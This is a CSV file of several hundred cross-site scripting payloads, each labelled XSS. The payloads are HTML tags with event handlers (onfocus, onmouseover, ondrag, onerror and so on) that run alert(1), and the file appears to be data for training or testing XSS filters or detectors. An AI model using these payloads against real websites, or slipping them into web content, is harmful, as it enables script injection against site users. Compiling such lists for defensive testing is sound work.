payload,attack
"<img onkeyup=""alert(1)"" contenteditable>test</img>",XSS
"<img onmousedown=""alert(1)"">test</img>",XSS
"<img onmouseenter=""alert(1)"">test</img>",XSS
"<img onmouseleave=""alert(1)"">test</img>",XSS
"<img onmousemove=""alert(1)"">test</img>",XSS
"<img onmouseout=""alert(1)"">test</img>",XSS
"<img onmouseover=""alert(1)"">test</img>",XSS
"<img onmouseup=""alert(1)"">test</img>",XSS
"<img onpaste=""alert(1)"" contenteditable>test</img>",XSS
<img src/onerror=alert(1)>,XSS
<img src=validimage.png onload=alert(1)>,XSS
<img src=validimage.png onloadend=alert(1)>,XSS
<img src=validimage.png onloadstart=alert(1)>,XSS
<img srcset=1 onerror=alert(1)>,XSS
<img srcset=validimage.png onload=alert(1)>,XSS
"<img usemap=#x><map name=""x""><area href onfocus=alert(1) id=x>",XSS
"<img usemap=#x><map name=""x""><area href onfocusin=alert(1) id=x>",XSS
<input autofocus onfocus=alert(1)>,XSS
<input autofocus onfocusin=alert(1)>,XSS
"<input draggable=""true"" ondrag=""alert(1)"">test</input>",XSS
"<input draggable=""true"" ondragend=""alert(1)"">test</input>",XSS
"<input draggable=""true"" ondragenter=""alert(1)"">test</input>",XSS
"<input draggable=""true"" ondragleave=""alert(1)"">test</input>",XSS
"<input draggable=""true"" ondragstart=""alert(1)"">test</input>",XSS
<input id=x onfocus=alert(1)>,XSS
<input id=x onfocusin=alert(1)>,XSS
<input id=x tabindex=1 onactivate=alert(1)></input>,XSS
<input id=x tabindex=1 onbeforeactivate=alert(1)></input>,XSS
<input id=x tabindex=1 onbeforedeactivate=alert(1)></input><input autofocus>,XSS
<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus>,XSS
<input onauxclick=alert(1)>,XSS
"<input onbeforecopy=alert(1) value=""XSS"" autofocus>",XSS
"<input onbeforecut=alert(1) value=""XSS"" autofocus>",XSS
"<input onbeforepaste=alert(1) value="""" autofocus>",XSS
<input onblur=alert(1) id=x><input autofocus>,XSS
<input onchange=alert(1) value=xss>,XSS
"<input onclick=""alert(1)"">test</input>",XSS
"<input oncontextmenu=""alert(1)"">test</input>",XSS
"<input oncopy=alert(1) value=""XSS"" autofocus>",XSS
"<input oncut=alert(1) value=""XSS"" autofocus>",XSS
"<input ondblclick=""alert(1)"">test</input>",XSS
<input onfocusout=alert(1) id=x><input autofocus>,XSS
<input oninput=alert(1) value=xss>,XSS
"<input onkeydown=""alert(1)"" contenteditable>test</input>",XSS
"<input onkeypress=""alert(1)"" contenteditable>test</input>",XSS
"<input onkeyup=""alert(1)"" contenteditable>test</input>",XSS
"<input onmousedown=""alert(1)"">test</input>",XSS
"<input onmouseenter=""alert(1)"">test</input>",XSS
"<input onmouseleave=""alert(1)"">test</input>",XSS
"<input onmousemove=""alert(1)"">test</input>",XSS
"<input onmouseout=""alert(1)"">test</input>",XSS
"<input onmouseover=""alert(1)"">test</input>",XSS
"<input onmouseup=""alert(1)"">test</input>",XSS
"<input onpaste=alert(1) value="""" autofocus>",XSS
"<input onselect=alert(1) value=""XSS"" autofocus>",XSS
<input type=checkbox id=x onfocus=alert(1)>,XSS
<input type=checkbox id=x onfocusin=alert(1)>,XSS
<input type=image onloadend=alert(1) src=validimage.png>,XSS
<input type=image onloadstart=alert(1) src=validimage.png>,XSS
<input type=image src=1 onerror=alert(1)>,XSS
<input type=image src=validimage.png onload=alert(1)>,XSS
<input type=radio id=x onfocus=alert(1)>,XSS
<input type=radio id=x onfocusin=alert(1)>,XSS
"<ins draggable=""true"" ondrag=""alert(1)"">test</ins>",XSS
"<ins draggable=""true"" ondragend=""alert(1)"">test</ins>",XSS
"<ins draggable=""true"" ondragenter=""alert(1)"">test</ins>",XSS
"<ins draggable=""true"" ondragleave=""alert(1)"">test</ins>",XSS
"<ins draggable=""true"" ondragstart=""alert(1)"">test</ins>",XSS
<ins id=x tabindex=1 onactivate=alert(1)></ins>,XSS
<ins id=x tabindex=1 onbeforeactivate=alert(1)></ins>,XSS
<ins id=x tabindex=1 onbeforedeactivate=alert(1)></ins><input autofocus>,XSS
<ins id=x tabindex=1 ondeactivate=alert(1)></ins><input id=y autofocus>,XSS
<ins id=x tabindex=1 onfocus=alert(1)></ins>,XSS
<ins id=x tabindex=1 onfocusin=alert(1)></ins>,XSS
"<ins onbeforecopy=""alert(1)"" contenteditable>test</ins>",XSS
"<ins onbeforecut=""alert(1)"" contenteditable>test</ins>",XSS
"<ins onbeforepaste=""alert(1)"" contenteditable>test</ins>",XSS
<ins onblur=alert(1) tabindex=1 id=x></ins><input autofocus>,XSS
"<ins onclick=""alert(1)"">test</ins>",XSS
"<ins oncontextmenu=""alert(1)"">test</ins>",XSS
"<ins oncopy=""alert(1)"" contenteditable>test</ins>",XSS
"<ins oncut=""alert(1)"" contenteditable>test</ins>",XSS
"<ins ondblclick=""alert(1)"">test</ins>",XSS
<ins onfocusout=alert(1) tabindex=1 id=x></ins><input autofocus>,XSS
"<ins onkeydown=""alert(1)"" contenteditable>test</ins>",XSS
"<ins onkeypress=""alert(1)"" contenteditable>test</ins>",XSS
"<ins onkeyup=""alert(1)"" contenteditable>test</ins>",XSS
"<ins onmousedown=""alert(1)"">test</ins>",XSS
"<ins onmouseenter=""alert(1)"">test</ins>",XSS
"<ins onmouseleave=""alert(1)"">test</ins>",XSS
"<ins onmousemove=""alert(1)"">test</ins>",XSS
"<ins onmouseout=""alert(1)"">test</ins>",XSS
"<ins onmouseover=""alert(1)"">test</ins>",XSS
"<ins onmouseup=""alert(1)"">test</ins>",XSS
"<ins onpaste=""alert(1)"" contenteditable>test</ins>",XSS
"<isindex draggable=""true"" ondrag=""alert(1)"">test</isindex>",XSS
"<isindex draggable=""true"" ondragend=""alert(1)"">test</isindex>",XSS
"<isindex draggable=""true"" ondragenter=""alert(1)"">test</isindex>",XSS
"<isindex draggable=""true"" ondragleave=""alert(1)"">test</isindex>",XSS
"<isindex draggable=""true"" ondragstart=""alert(1)"">test</isindex>",XSS
<isindex id=x tabindex=1 onactivate=alert(1)></isindex>,XSS
<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>,XSS
<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>,XSS
<isindex id=x tabindex=1 ondeactivate=alert(1)></isindex><input id=y autofocus>,XSS
<isindex id=x tabindex=1 onfocus=alert(1)></isindex>,XSS
<isindex id=x tabindex=1 onfocusin=alert(1)></isindex>,XSS
"<isindex onbeforecopy=""alert(1)"" contenteditable>test</isindex>",XSS
"<isindex onbeforecut=""alert(1)"" contenteditable>test</isindex>",XSS
"<isindex onbeforepaste=""alert(1)"" contenteditable>test</isindex>",XSS
<isindex onblur=alert(1) tabindex=1 id=x></isindex><input autofocus>,XSS
"<isindex onclick=""alert(1)"">test</isindex>",XSS
"<isindex oncontextmenu=""alert(1)"">test</isindex>",XSS
"<isindex oncopy=""alert(1)"" contenteditable>test</isindex>",XSS
"<isindex oncut=""alert(1)"" contenteditable>test</isindex>",XSS
"<isindex ondblclick=""alert(1)"">test</isindex>",XSS
<isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus>,XSS
"<isindex onkeydown=""alert(1)"" contenteditable>test</isindex>",XSS
"<isindex onkeypress=""alert(1)"" contenteditable>test</isindex>",XSS
"<isindex onkeyup=""alert(1)"" contenteditable>test</isindex>",XSS
"<isindex onmousedown=""alert(1)"">test</isindex>",XSS
"<isindex onmouseenter=""alert(1)"">test</isindex>",XSS
"<isindex onmouseleave=""alert(1)"">test</isindex>",XSS
"<isindex onmousemove=""alert(1)"">test</isindex>",XSS
"<isindex onmouseout=""alert(1)"">test</isindex>",XSS
"<isindex onmouseover=""alert(1)"">test</isindex>",XSS
"<isindex onmouseup=""alert(1)"">test</isindex>",XSS
"<isindex onpaste=""alert(1)"" contenteditable>test</isindex>",XSS
<isindex type=image onload=alert(1) src=validimage.png>,XSS
<isindex type=image src=1 onerror=alert(1)>,XSS
"<kbd draggable=""true"" ondrag=""alert(1)"">test</kbd>",XSS
"<kbd draggable=""true"" ondragend=""alert(1)"">test</kbd>",XSS
"<kbd draggable=""true"" ondragenter=""alert(1)"">test</kbd>",XSS
"<kbd draggable=""true"" ondragleave=""alert(1)"">test</kbd>",XSS
"<kbd draggable=""true"" ondragstart=""alert(1)"">test</kbd>",XSS
<kbd id=x tabindex=1 onactivate=alert(1)></kbd>,XSS
<kbd id=x tabindex=1 onbeforeactivate=alert(1)></kbd>,XSS
<kbd id=x tabindex=1 onbeforedeactivate=alert(1)></kbd><input autofocus>,XSS
<kbd id=x tabindex=1 ondeactivate=alert(1)></kbd><input id=y autofocus>,XSS
<kbd id=x tabindex=1 onfocus=alert(1)></kbd>,XSS
<kbd id=x tabindex=1 onfocusin=alert(1)></kbd>,XSS
"<kbd onbeforecopy=""alert(1)"" contenteditable>test</kbd>",XSS
"<kbd onbeforecut=""alert(1)"" contenteditable>test</kbd>",XSS
"<kbd onbeforepaste=""alert(1)"" contenteditable>test</kbd>",XSS
<kbd onblur=alert(1) tabindex=1 id=x></kbd><input autofocus>,XSS
"<kbd onclick=""alert(1)"">test</kbd>",XSS
"<kbd oncontextmenu=""alert(1)"">test</kbd>",XSS
"<kbd oncopy=""alert(1)"" contenteditable>test</kbd>",XSS
"<kbd oncut=""alert(1)"" contenteditable>test</kbd>",XSS
"<kbd ondblclick=""alert(1)"">test</kbd>",XSS
<kbd onfocusout=alert(1) tabindex=1 id=x></kbd><input autofocus>,XSS
"<kbd onkeydown=""alert(1)"" contenteditable>test</kbd>",XSS
"<kbd onkeypress=""alert(1)"" contenteditable>test</kbd>",XSS
"<kbd onkeyup=""alert(1)"" contenteditable>test</kbd>",XSS
"<kbd onmousedown=""alert(1)"">test</kbd>",XSS
"<kbd onmouseenter=""alert(1)"">test</kbd>",XSS
"<kbd onmouseleave=""alert(1)"">test</kbd>",XSS
"<kbd onmousemove=""alert(1)"">test</kbd>",XSS
"<kbd onmouseout=""alert(1)"">test</kbd>",XSS
"<kbd onmouseover=""alert(1)"">test</kbd>",XSS
"<kbd onmouseup=""alert(1)"">test</kbd>",XSS
"<kbd onpaste=""alert(1)"" contenteditable>test</kbd>",XSS
<keygen autofocus onfocus=alert(1)>,XSS
<keygen autofocus onfocusin=alert(1)>,XSS
"<keygen draggable=""true"" ondrag=""alert(1)"">test</keygen>",XSS
"<keygen draggable=""true"" ondragend=""alert(1)"">test</keygen>",XSS
"<keygen draggable=""true"" ondragenter=""alert(1)"">test</keygen>",XSS
"<keygen draggable=""true"" ondragleave=""alert(1)"">test</keygen>",XSS
"<keygen draggable=""true"" ondragstart=""alert(1)"">test</keygen>",XSS
<keygen id=x onfocus=alert(1)>,XSS
<keygen id=x onfocusin=alert(1)>,XSS
<keygen id=x tabindex=1 onactivate=alert(1)></keygen>,XSS
<keygen id=x tabindex=1 onbeforeactivate=alert(1)></keygen>,XSS
<keygen id=x tabindex=1 onbeforedeactivate=alert(1)></keygen><input autofocus>,XSS
<keygen id=x tabindex=1 ondeactivate=alert(1)></keygen><input id=y autofocus>,XSS
"<keygen onbeforecopy=""alert(1)"" contenteditable>test</keygen>",XSS
"<keygen onbeforecut=""alert(1)"" contenteditable>test</keygen>",XSS
"<keygen onbeforepaste=""alert(1)"" contenteditable>test</keygen>",XSS
<keygen onblur=alert(1) tabindex=1 id=x></keygen><input autofocus>,XSS
"<keygen onclick=""alert(1)"">test</keygen>",XSS
"<keygen oncontextmenu=""alert(1)"">test</keygen>",XSS
"<keygen oncopy=""alert(1)"" contenteditable>test</keygen>",XSS
"<keygen oncut=""alert(1)"" contenteditable>test</keygen>",XSS
"<keygen ondblclick=""alert(1)"">test</keygen>",XSS
<keygen onfocusout=alert(1) tabindex=1 id=x></keygen><input autofocus>,XSS
"<keygen onkeydown=""alert(1)"" contenteditable>test</keygen>",XSS
"<keygen onkeypress=""alert(1)"" contenteditable>test</keygen>",XSS
"<keygen onkeyup=""alert(1)"" contenteditable>test</keygen>",XSS
"<keygen onmousedown=""alert(1)"">test</keygen>",XSS
"<keygen onmouseenter=""alert(1)"">test</keygen>",XSS
"<keygen onmouseleave=""alert(1)"">test</keygen>",XSS
"<keygen onmousemove=""alert(1)"">test</keygen>",XSS
"<keygen onmouseout=""alert(1)"">test</keygen>",XSS
"<keygen onmouseover=""alert(1)"">test</keygen>",XSS
"<keygen onmouseup=""alert(1)"">test</keygen>",XSS
"<keygen onpaste=""alert(1)"" contenteditable>test</keygen>",XSS
"<label draggable=""true"" ondrag=""alert(1)"">test</label>",XSS
"<label draggable=""true"" ondragend=""alert(1)"">test</label>",XSS
"<label draggable=""true"" ondragenter=""alert(1)"">test</label>",XSS
"<label draggable=""true"" ondragleave=""alert(1)"">test</label>",XSS
"<label draggable=""true"" ondragstart=""alert(1)"">test</label>",XSS
<label id=x tabindex=1 onactivate=alert(1)></label>,XSS
<label id=x tabindex=1 onbeforeactivate=alert(1)></label>,XSS
<label id=x tabindex=1 onbeforedeactivate=alert(1)></label><input autofocus>,XSS
<label id=x tabindex=1 ondeactivate=alert(1)></label><input id=y autofocus>,XSS
<label id=x tabindex=1 onfocus=alert(1)></label>,XSS
<label id=x tabindex=1 onfocusin=alert(1)></label>,XSS
"<label onbeforecopy=""alert(1)"" contenteditable>test</label>",XSS
"<label onbeforecut=""alert(1)"" contenteditable>test</label>",XSS
"<label onbeforepaste=""alert(1)"" contenteditable>test</label>",XSS
<label onblur=alert(1) tabindex=1 id=x></label><input autofocus>,XSS
"<label onclick=""alert(1)"">test</label>",XSS
"<label oncontextmenu=""alert(1)"">test</label>",XSS
"<label oncopy=""alert(1)"" contenteditable>test</label>",XSS
"<label oncut=""alert(1)"" contenteditable>test</label>",XSS
"<label ondblclick=""alert(1)"">test</label>",XSS
<label onfocusout=alert(1) tabindex=1 id=x></label><input autofocus>,XSS
"<label onkeydown=""alert(1)"" contenteditable>test</label>",XSS
"<label onkeypress=""alert(1)"" contenteditable>test</label>",XSS
"<label onkeyup=""alert(1)"" contenteditable>test</label>",XSS
"<label onmousedown=""alert(1)"">test</label>",XSS
"<label onmouseenter=""alert(1)"">test</label>",XSS
"<label onmouseleave=""alert(1)"">test</label>",XSS
"<label onmousemove=""alert(1)"">test</label>",XSS
"<label onmouseout=""alert(1)"">test</label>",XSS
"<label onmouseover=""alert(1)"">test</label>",XSS
"<label onmouseup=""alert(1)"">test</label>",XSS
"<label onpaste=""alert(1)"" contenteditable>test</label>",XSS
"<legend draggable=""true"" ondrag=""alert(1)"">test</legend>",XSS
"<legend draggable=""true"" ondragend=""alert(1)"">test</legend>",XSS
"<legend draggable=""true"" ondragenter=""alert(1)"">test</legend>",XSS
"<legend draggable=""true"" ondragleave=""alert(1)"">test</legend>",XSS
"<legend draggable=""true"" ondragstart=""alert(1)"">test</legend>",XSS
<legend id=x tabindex=1 onactivate=alert(1)></legend>,XSS
<legend id=x tabindex=1 onbeforeactivate=alert(1)></legend>,XSS
<legend id=x tabindex=1 onbeforedeactivate=alert(1)></legend><input autofocus>,XSS
<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>,XSS
<legend id=x tabindex=1 onfocus=alert(1)></legend>,XSS
<legend id=x tabindex=1 onfocusin=alert(1)></legend>,XSS
"<legend onbeforecopy=""alert(1)"" contenteditable>test</legend>",XSS
"<legend onbeforecut=""alert(1)"" contenteditable>test</legend>",XSS
"<legend onbeforepaste=""alert(1)"" contenteditable>test</legend>",XSS
<legend onblur=alert(1) tabindex=1 id=x></legend><input autofocus>,XSS
"<legend onclick=""alert(1)"">test</legend>",XSS
"<legend oncontextmenu=""alert(1)"">test</legend>",XSS
"<legend oncopy=""alert(1)"" contenteditable>test</legend>",XSS
"<legend oncut=""alert(1)"" contenteditable>test</legend>",XSS
"<legend ondblclick=""alert(1)"">test</legend>",XSS
<legend onfocusout=alert(1) tabindex=1 id=x></legend><input autofocus>,XSS
"<legend onkeydown=""alert(1)"" contenteditable>test</legend>",XSS
"<legend onkeypress=""alert(1)"" contenteditable>test</legend>",XSS
"<legend onkeyup=""alert(1)"" contenteditable>test</legend>",XSS
"<legend onmousedown=""alert(1)"">test</legend>",XSS
"<legend onmouseenter=""alert(1)"">test</legend>",XSS
"<legend onmouseleave=""alert(1)"">test</legend>",XSS
"<legend onmousemove=""alert(1)"">test</legend>",XSS
"<legend onmouseout=""alert(1)"">test</legend>",XSS
"<legend onmouseover=""alert(1)"">test</legend>",XSS
"<legend onmouseup=""alert(1)"">test</legend>",XSS
"<legend onpaste=""alert(1)"" contenteditable>test</legend>",XSS
"<li draggable=""true"" ondrag=""alert(1)"">test</li>",XSS
"<li draggable=""true"" ondragend=""alert(1)"">test</li>",XSS
"<li draggable=""true"" ondragenter=""alert(1)"">test</li>",XSS
"<li draggable=""true"" ondragleave=""alert(1)"">test</li>",XSS
"<li draggable=""true"" ondragstart=""alert(1)"">test</li>",XSS
<li id=x tabindex=1 onactivate=alert(1)></li>,XSS
<li id=x tabindex=1 onbeforeactivate=alert(1)></li>,XSS
<li id=x tabindex=1 onbeforedeactivate=alert(1)></li><input autofocus>,XSS
<li id=x tabindex=1 ondeactivate=alert(1)></li><input id=y autofocus>,XSS
<li id=x tabindex=1 onfocus=alert(1)></li>,XSS
<li id=x tabindex=1 onfocusin=alert(1)></li>,XSS
"<li onbeforecopy=""alert(1)"" contenteditable>test</li>",XSS
"<li onbeforecut=""alert(1)"" contenteditable>test</li>",XSS
"<li onbeforepaste=""alert(1)"" contenteditable>test</li>",XSS
<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>,XSS
"<li onclick=""alert(1)"">test</li>",XSS
"<li oncontextmenu=""alert(1)"">test</li>",XSS
"<li oncopy=""alert(1)"" contenteditable>test</li>",XSS
"<li oncut=""alert(1)"" contenteditable>test</li>",XSS
"<li ondblclick=""alert(1)"">test</li>",XSS
<li onfocusout=alert(1) tabindex=1 id=x></li><input autofocus>,XSS
"<li onkeydown=""alert(1)"" contenteditable>test</li>",XSS
"<li onkeypress=""alert(1)"" contenteditable>test</li>",XSS
"<li onkeyup=""alert(1)"" contenteditable>test</li>",XSS
"<li onmousedown=""alert(1)"">test</li>",XSS
"<li onmouseenter=""alert(1)"">test</li>",XSS
"<li onmouseleave=""alert(1)"">test</li>",XSS
"<li onmousemove=""alert(1)"">test</li>",XSS
"<li onmouseout=""alert(1)"">test</li>",XSS
"<li onmouseover=""alert(1)"">test</li>",XSS
"<li onmouseup=""alert(1)"">test</li>",XSS
"<li onpaste=""alert(1)"" contenteditable>test</li>",XSS
"<link draggable=""true"" ondrag=""alert(1)"">test</link>",XSS
"<link draggable=""true"" ondragend=""alert(1)"">test</link>",XSS
"<link draggable=""true"" ondragenter=""alert(1)"">test</link>",XSS
"<link draggable=""true"" ondragleave=""alert(1)"">test</link>",XSS
"<link draggable=""true"" ondragstart=""alert(1)"">test</link>",XSS
<link href=validstyles.css rel=stylesheet onload=alert(1)>,XSS
<link id=x tabindex=1 onactivate=alert(1)></link>,XSS
<link id=x tabindex=1 onbeforeactivate=alert(1)></link>,XSS
<link id=x tabindex=1 onbeforedeactivate=alert(1)></link><input autofocus>,XSS
<link id=x tabindex=1 ondeactivate=alert(1)></link><input id=y autofocus>,XSS
"<link onbeforecopy=""alert(1)"" contenteditable>test</link>",XSS
"<link onbeforecut=""alert(1)"" contenteditable>test</link>",XSS
"<link onbeforepaste=""alert(1)"" contenteditable>test</link>",XSS
<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>,XSS
"<link onclick=""alert(1)"">test</link>",XSS
"<link oncontextmenu=""alert(1)"">test</link>",XSS
"<link oncopy=""alert(1)"" contenteditable>test</link>",XSS
"<link oncut=""alert(1)"" contenteditable>test</link>",XSS
"<link ondblclick=""alert(1)"">test</link>",XSS
<link onfocus=alert(1) id=x tabindex=1 style=display:block>,XSS
<link onfocusin=alert(1) id=x tabindex=1 style=display:block>,XSS
<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>,XSS
"<link onkeydown=""alert(1)"" contenteditable>test</link>",XSS
"<link onkeypress=""alert(1)"" contenteditable>test</link>",XSS
"<link onkeyup=""alert(1)"" contenteditable>test</link>",XSS
